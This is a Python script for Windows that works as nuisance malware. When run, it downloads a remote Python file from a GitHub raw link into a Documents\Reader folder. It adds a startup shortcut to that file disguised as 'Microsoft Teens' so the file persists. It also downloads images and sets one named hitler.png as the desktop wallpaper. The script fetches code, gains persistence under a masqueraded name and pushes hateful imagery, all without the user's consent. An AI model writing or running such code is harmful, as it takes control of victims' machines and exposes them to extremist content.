import os
import requests
import sys
import winshell
import struct
import ctypes

def is_64_windows():
    """Find out how many bits is OS. """
    return struct.calcsize('P') * 8 == 64


def get_sys_parameters_info():
    """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function. """
    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
        else ctypes.windll.user32.SystemParametersInfoA



def create_desktop_shortcut(target_path, shortcut_name):
    # Get the path to the desktop folder
    desktop = winshell.desktop()
    shortcut_path = os.path.join(desktop, f"{shortcut_name}.lnk")

    winshell.CreateShortcut(
        Path= shortcut_path,
        Target = target_path,
        Icon=(target_path, 1)
    )


def change_wallpaper(WALLPAPER_PATH = None):
    
    SPI_SETDESKWALLPAPER = 20

    sys_parameters_info = get_sys_parameters_info()
    r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)

    # When the SPI_SETDESKWALLPAPER flag is used,
    # SystemParametersInfo returns TRUE
    # unless there is an error (like when the specified file doesn't exist).
    if not r:
        print(ctypes.WinError())



def create_startup_shortcut(target_path, shortcut_name):
    startup = winshell.startup() #"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\\" 
    print(startup)
    shortcut_path = os.path.join(startup, f"{shortcut_name}.lnk")

    winshell.CreateShortcut(
        Path= shortcut_path,
        Target = target_path,
        Icon=(sys.executable, 1)
    )

def download_raw_content(raw_link, filepath = None):
    
    response = requests.get(raw_link)
    if filepath == None: print("Need to enter filepath aswell.")
    
    with open(filepath, "wb") as f:
        f.write(response.content)


def file_check_create(filepath = None, content = None):
    
    if os.path.exists(filepath):
        print(f"file: '{filepath}' already exists.")


    elif filepath == None:
        return

    else:
        with open(filepath, "wb") as f:
            f.write(content)


def dir_check_create(filepath = None):
    if not(os.path.exists(filepath)):
        os.makedirs(filepath)
    
    else:
        print(f"dir: '{filepath}' already exists")
        


def run_on_startup():
    documents = os.path.normpath(os.path.expanduser("~/Documents"))
    file_path = f"{documents}/Reader/Reader.py"
    shortcut_name = "Microsoft Teens"
    #create_startup_shortcut(file_path, "Microsoft Teens")
    create_startup_shortcut(file_path, shortcut_name)

def hide_program():
    response = requests.get("https://raw.githubusercontent.com/Dominik-Gryko/Friendly-Experiment/main/main.py")
    documents = os.path.normpath(os.path.expanduser("~/Documents"))
    directory_path = f"{documents}\Reader"
    file_path = f"{documents}\Reader\Reader.py"

    dir_check_create(directory_path)
    file_check_create(file_path, response.content)




def main():
    hide_program()
    run_on_startup()

    desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
    documents = os.path.normpath(os.path.expanduser("~/Documents"))
    image_path_pepe = f"{desktop}/Pepe The Frog Is Watching You.png"
    image_path_hitler = f"{documents}\Reader\hitler.png"
    download_raw_content("https://i.imgur.com/8nLFCVP.png", image_path_pepe)
    download_raw_content("https://pbs.twimg.com/media/Fu8AKWJWIAApsVk.jpg", image_path_hitler)

    change_wallpaper(image_path_hitler)


main()
